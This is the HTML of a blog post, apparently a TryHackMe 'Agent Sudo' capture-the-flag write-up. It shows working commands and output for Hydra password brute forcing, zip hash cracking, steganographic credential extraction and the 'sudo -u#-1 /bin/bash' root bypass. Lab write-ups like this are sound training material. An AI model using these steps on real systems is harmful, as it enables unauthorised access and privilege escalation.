@@ -1,0 +1,389 @@
+<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="THM - Agent Sudo" /><meta name="author" content="NiBi" /><meta property="og:locale" content="en" /><meta name="description" content="Enumeration" /><meta property="og:description" content="Enumeration" /><link rel="canonical" href="/posts/THM-agent-sudo/" /><meta property="og:url" content="/posts/THM-agent-sudo/" /><meta property="og:site_name" content="NiBi" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-06-05T00:00:00+00:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="THM - Agent Sudo" /><meta name="twitter:site" content="@twitter_username" /><meta name="twitter:creator" content="@NiBi" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"NiBi"},"dateModified":"2022-06-05T00:00:00+00:00","datePublished":"2022-06-05T00:00:00+00:00","description":"Enumeration","headline":"THM - Agent Sudo","mainEntityOfPage":{"@type":"WebPage","@id":"/posts/THM-agent-sudo/"},"url":"/posts/THM-agent-sudo/"}</script><title>THM - Agent Sudo | NiBi</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="NiBi"><meta name="application-name" content="NiBi"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src=" /assets/pp.jpeg " alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">NiBi</a></div><div class="site-subtitle font-italic">All my Write Ups are here !</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT ME</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/NiBi8z" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>THM - Agent Sudo </span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>THM - Agent Sudo</h1><div class="post-meta text-muted"><div> By <em> <a href="https://github.com/username">NiBi</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" data-ts="1654387200" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2022-06-05 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1457 words"> <em>8 min</em> read</span></div></div></div><div class="post-content"><h1 id="enumeration">Enumeration</h1><h2 id="nmap"><span class="mr-2">Nmap</span><a href="#nmap" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Let’s start by using nmap to see which ports are open</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+</pre><td class="rouge-code"><pre>PORT STATE SERVICE VERSION
+21/tcp open ftp vsftpd 3.0.3
+22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+| 2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 <span class="o">(</span>RSA<span class="o">)</span>
+| 256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea <span class="o">(</span>ECDSA<span class="o">)</span>
+|_ 256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp open http Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
+|_http-title: Annoucement
+|_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
+Service Info: OSs: Unix, Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>16.31 seconds
+</pre></table></code></div></div><p>We have 3 services: <br /> -FTP<br /> -SSH<br /> -HTTP</p><h3 id="ftp-21"><span class="mr-2">FTP (21)</span><a href="#ftp-21" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre><td class="rouge-code"><pre>─<span class="nv">$ </span>ftp 10.10.87.101 
+Connected to 10.10.87.101.
+220 <span class="o">(</span>vsFTPd 3.0.3<span class="o">)</span>
+Name <span class="o">(</span>10.10.87.101:kali<span class="o">)</span>: anonymous
+331 Please specify the password.
+Password: 
+530 Login incorrect.
+ftp: Login failed
+ftp&gt; 
+</pre></table></code></div></div><p>We can’t connect amously to ftp :/ <br /> Let’s put it aside and come back to it later.</p><h3 id="port-80"><span class="mr-2">Port 80</span><a href="#port-80" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>When we go to the ip with Firefox we have a blank page with this text:</p><div class="language-text highlighter-rouge"><div class="code-header"> <span data-label-text="Text"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre><td class="rouge-code"><pre>Dear agents, 
+
+Use your own codename as user-agent to access the site. 
+
+From,
+Agent R
+</pre></table></code></div></div><p>So, i guess that R is the code name of one agent.</p><p>Let’s bruteforce codename from A to Z to access the website</p><p>We can use BurpSuite to do this.</p><p>First, we add tags around User-agent and burp will replace this user-agent by our text (here, all the letters of the alphabet).</p><p><img data-src="../../assets/agent_sudo/add_tags.png" alt="Tags" data-proofer-ignore></p><p>Now, we choose by what we want to replace the user-agent on each request.</p><p><img data-src="../../assets/agent_sudo/put_alph_as_letters.png" alt="payloads" data-proofer-ignore></p><p>After what we can press “start attack” and see results.</p><p><img data-src="../../assets/agent_sudo/looking_status.png" alt="result" data-proofer-ignore></p><p>By looking result we see that the status is different for “C”. We have a redirection</p><p>We have this message :</p><div class="language-text highlighter-rouge"><div class="code-header"> <span data-label-text="Text"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre><td class="rouge-code"><pre>Attention chris,
+
+Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak! 
+
+From,
+Agent R
+</pre></table></code></div></div><p>So a user “chris” have a weak password. We can try to bruteforce the FTP server or the SSH one. We also discover an Agent J.</p><p>Let’s use Hydra to bruteforce the FTP server with rockyou.</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+</pre><td class="rouge-code"><pre>└─<span class="nv">$ </span>hydra <span class="nt">-s</span> 21 <span class="nt">-l</span> chris <span class="nt">-P</span> /usr/share/wordlists/rockyou.txt <span class="nt">-t</span> 16 10.10.87.101 ftp
+Hydra v9.2 <span class="o">(</span>c<span class="o">)</span> 2021 by van Hauser/THC &amp; David Maciejak - Please <span class="k">do </span>not use <span class="k">in </span>military or secret service organizations, or <span class="k">for </span>illegal purposes <span class="o">(</span>this is non-binding, these <span class="k">***</span> ignore laws and ethics anyway<span class="o">)</span><span class="nb">.</span>
+
+Hydra <span class="o">(</span>https://github.com/vanhauser-thc/thc-hydra<span class="o">)</span> starting at 2022-06-06 10:52:29
+<span class="o">[</span>DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries <span class="o">(</span>l:1/p:14344399<span class="o">)</span>, ~896525 tries per task
+<span class="o">[</span>DATA] attacking ftp://10.10.87.101:21/
+<span class="o">[</span>21][ftp] host: 10.10.87.101 login: chris password: crystal
+1 of 1 target successfully completed, 1 valid password found
+Hydra <span class="o">(</span>https://github.com/vanhauser-thc/thc-hydra<span class="o">)</span> finished at 2022-06-06 10:53:29
+
+┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Desktop/ctf]
+└─<span class="nv">$ </span>
+</pre></table></code></div></div><p>Eheh, it’s worked !</p><p>Thanks to Hydra We now have chris’ password.</p><h3 id="connecting-to-ftp-with-chris-creds"><span class="mr-2"> Connecting to FTP with chris’ creds</span><a href="#connecting-to-ftp-with-chris-creds" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+</pre><td class="rouge-code"><pre>└─<span class="nv">$ </span>ftp 10.10.87.101
+Connected to 10.10.87.101.
+220 <span class="o">(</span>vsFTPd 3.0.3<span class="o">)</span>
+Name <span class="o">(</span>10.10.87.101:kali<span class="o">)</span>: chris
+331 Please specify the password.
+Password: 
+230 Login successful.
+Remote system <span class="nb">type </span>is UNIX.
+Using binary mode to transfer files.
+ftp&gt; <span class="nb">dir
+</span>229 Entering Extended Passive Mode <span class="o">(||</span>|42608|<span class="o">)</span>
+150 Here comes the directory listing.
+<span class="nt">-rw-r--r--</span> 1 0 0 217 Oct 29 2019 To_agentJ.txt
+<span class="nt">-rw-r--r--</span> 1 0 0 33143 Oct 29 2019 cute-alien.jpg
+<span class="nt">-rw-r--r--</span> 1 0 0 34842 Oct 29 2019 cutie.png
+226 Directory send OK.
+</pre></table></code></div></div><p>In “To_agentJ.txt” we have :</p><div class="language-text highlighter-rouge"><div class="code-header"> <span data-label-text="Text"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre><td class="rouge-code"><pre>
+Dear agent J,
+
+All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.
+
+From,
+Agent C
+</pre></table></code></div></div><p>Uh, i hate steganography…</p><p>I had no result with steghide and exiftool but with binwalk we see that a zip file is in cutie.png</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre><td class="rouge-code"><pre>└─<span class="nv">$ </span>binwalk cutie.png 
+
+DECIMAL HEXADECIMAL DESCRIPTION
+<span class="nt">--------------------------------------------------------------------------------</span>
+0 0x0 PNG image, 528 x 528, 8-bit colormap, non-interlaced
+869 0x365 Zlib compressed data, best compression
+34562 0x8702 Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
+34820 0x8804 End of Zip archive, footer length: 22
+</pre></table></code></div></div><p>we exctract it with binwalk -e.</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+</pre><td class="rouge-code"><pre>└─<span class="nv">$ </span>binwalk cutie.png <span class="nt">-e</span>
+
+DECIMAL HEXADECIMAL DESCRIPTION
+<span class="nt">--------------------------------------------------------------------------------</span>
+0 0x0 PNG image, 528 x 528, 8-bit colormap, non-interlaced
+869 0x365 Zlib compressed data, best compression
+34562 0x8702 Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
+34820 0x8804 End of Zip archive, footer length: 22
+
+
+┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Desktop/ctf]
+└─<span class="nv">$ </span><span class="nb">ls
+</span>cute-alien.jpg cutie.png _cutie.png.extracted To_agentJ.txt
+
+┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Desktop/ctf]
+└─<span class="nv">$ </span><span class="nb">cd </span>_cutie.png.extracted 
+
+┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Desktop/ctf/_cutie.png.extracted]
+└─<span class="nv">$ </span>l 
+365 365.zlib 8702.zip To_agentR.txt
+
+
+└─<span class="nv">$ </span>unzip 8702.zip
+Archive: 8702.zip
+skipping: To_agentR.txt need PK compat. v5.1 <span class="o">(</span>can <span class="k">do </span>v4.6<span class="o">)</span>
+</pre></table></code></div></div><p>8702.zip is encrytped, we can use zip2john to bruteforce it.</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+</pre><td class="rouge-code"><pre>┌──<span class="o">(</span>kali@kali<span class="o">)</span>-[~/Desktop/ctf/_cutie.png.extracted]
+└─<span class="nv">$ </span>zip2john 8702.zip <span class="o">&gt;</span> <span class="nb">hash</span>
+
+┌──<span class="o">(</span>kali@kali<span class="o">)</span>-[~/Desktop/ctf/_cutie.png.extracted]
+└─<span class="nv">$ </span>john <span class="nb">hash</span> <span class="nt">--wordlist</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt 
+Using default input encoding: UTF-8
+Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>ZIP, WinZip <span class="o">[</span>PBKDF2-SHA1 256/256 AVX2 8x]<span class="o">)</span>
+Cost 1 <span class="o">(</span>HMAC size<span class="o">)</span> is 78 <span class="k">for </span>all loaded hashes
+Will run 2 OpenMP threads
+Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
+alien <span class="o">(</span>8702.zip/To_agentR.txt<span class="o">)</span> 
+1g 0:00:00:00 DONE <span class="o">(</span>2022-06-06 11:03<span class="o">)</span> 1.666g/s 40960p/s 40960c/s 40960C/s michael!..280789
+Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
+Session completed. 
+
+┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Desktop/ctf/_cutie.png.extracted]
+└─<span class="nv">$ </span>
+</pre></table></code></div></div><p>Again, John is too strong !</p><p>Let’s extract it with “7z e 8702.zip” and using alien as password.</p><p>Now, we can see the content of To_agentR.txt :</p><div class="language-text highlighter-rouge"><div class="code-header"> <span data-label-text="Text"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre><td class="rouge-code"><pre>Agent C,
+
+We need to send the picture to 'QXJlYTUx' as soon as possible!
+
+By,
+Agent R
+
+</pre></table></code></div></div><p>We have to decrypt “QXJlYTUx”. Using cyberchef we have.</p><p>It’s just a base64 enconding. QXJlYTUx means Area51</p><p>Now we can try to use this password with steghide to see if a message is hidden in one of the two initial pictures</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre>└─<span class="nv">$ </span>steghide <span class="nt">--extract</span> <span class="nt">-sf</span> cute-alien.jpg
+Enter passphrase: 
+wrote extracted data to <span class="s2">"message.txt"</span><span class="nb">.</span>
+</pre></table></code></div></div><p>Yes ! “message.txt” is inside ! Let’s read it.</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+</pre><td class="rouge-code"><pre>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Desktop/ctf]
+└─<span class="nv">$ </span><span class="nb">cat </span>message.txt 
+Hi james,
+
+Glad you find this message. Your login password is hackerrules!
+
+Don<span class="s1">'t ask me why the password look cheesy, ask agent R who set this password for you.
+
+Your buddy,
+chris
+</span></pre></table></code></div></div><p>Alright ! We have a login:password → james:hackerrules!</p><p>Moove to ssh !</p><h3 id="ssh"><span class="mr-2">SSH</span><a href="#ssh" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+</pre><td class="rouge-code"><pre>└─<span class="nv">$ </span>ssh james@10.10.87.101 
+The authenticity of host <span class="s1">'10.10.87.101 (10.10.87.101)'</span> can<span class="s1">'t be established.
+ED25519 key fingerprint is SHA256:rt6rNpPo1pGMkl4PRRE7NaQKAHV+UNkS9BfrCy8jVCA.
+This key is not known by any other names
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '</span>10.10.87.101<span class="s1">' (ED25519) to the list of known hosts.
+james@10.10.87.101'</span>s password: 
+Welcome to Ubuntu 18.04.3 LTS <span class="o">(</span>GNU/Linux 4.15.0-55-generic x86_64<span class="o">)</span>
+
+<span class="k">*</span> Documentation: https://help.ubuntu.com
+<span class="k">*</span> Management: https://landscape.canonical.com
+<span class="k">*</span> Support: https://ubuntu.com/advantage
+
+System information as of Mon Jun 6 15:10:27 UTC 2022
+
+System load: 0.0 Processes: 97
+Usage of /: 39.7% of 9.78GB Users logged <span class="k">in</span>: 0
+Memory usage: 34% IP address <span class="k">for </span>eth0: 10.10.87.101
+Swap usage: 0%
+
+
+75 packages can be updated.
+33 updates are security updates.
+
+
+Last login: Tue Oct 29 14:26:27 2019
+james@agent-sudo:~<span class="nv">$ </span>
+</pre></table></code></div></div><p>it’s worked !</p><p>Because of the machine’s name, i tried first “sudo -l” to see if we have any special rights.</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre><td class="rouge-code"><pre>james@agent-sudo:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
+<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>james: 
+Matching Defaults entries <span class="k">for </span>james on agent-sudo:
+env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
+
+User james may run the following commands on agent-sudo:
+<span class="o">(</span>ALL, <span class="o">!</span>root<span class="o">)</span> /bin/bash
+</pre></table></code></div></div><p>We can’t run bash as root but by googling this strange syntax i saw a security bypass in sudo 1.8.27 to run bash as root despite this command</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre><td class="rouge-code"><pre>james@agent-sudo:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-V</span>
+Sudo version 1.8.21p2
+Sudoers policy plugin version 1.8.21p2
+Sudoers file grammar version 46
+Sudoers I/O plugin version 1.8.21p2
+james@agent-sudo:~<span class="nv">$ </span>
+</pre></table></code></div></div><p>We have sudo 1.8.21p, our sudo version is vulnerable !</p><p>As we can see <a href="https://www.exploit-db.com/exploits/47502">here</a> we can bypass “(ALL, !root) /bin/bash” by typing “sudo -u#-1 /bin/bash”</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+</pre><td class="rouge-code"><pre>james@agent-sudo:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-u</span><span class="c">#-1 /bin/bash</span>
+root@agent-sudo:~# <span class="nb">cat</span> /root/root.txt 
+To Mr.hacker,
+
+Congratulation on rooting this box. This box was designed <span class="k">for </span>TryHackMe. Tips, always update your machine. 
+
+Your flag is 
+<span class="o">[</span>REDACTED]
+
+By,
+DesKel a.k.a Agent R
+root@agent-sudo:~# <span class="nb">cat</span> /home/james/user_flag.txt 
+<span class="o">[</span>REDACTED]
+root@agent-sudo:~#
+</pre></table></code></div></div><p>Thanks for reading !</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/try-hack-me/'>Try Hack Me</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/ctf/" class="post-tag no-text-decoration" >CTF</a> <a href="/tags/thm/" class="post-tag no-text-decoration" >THM</a> <a href="/tags/easy/" class="post-tag no-text-decoration" >easy</a> <a href="/tags/binwalk/" class="post-tag no-text-decoration" >binwalk</a> <a href="/tags/bruteforce/" class="post-tag no-text-decoration" >bruteforce</a> <a href="/tags/hydra/" class="post-tag no-text-decoration" >hydra</a> <a href="/tags/ftp/" class="post-tag no-text-decoration" >ftp</a> <a href="/tags/ssh/" class="post-tag no-text-decoration" >ssh</a> <a href="/tags/stegano/" class="post-tag no-text-decoration" >stegano</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"></div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 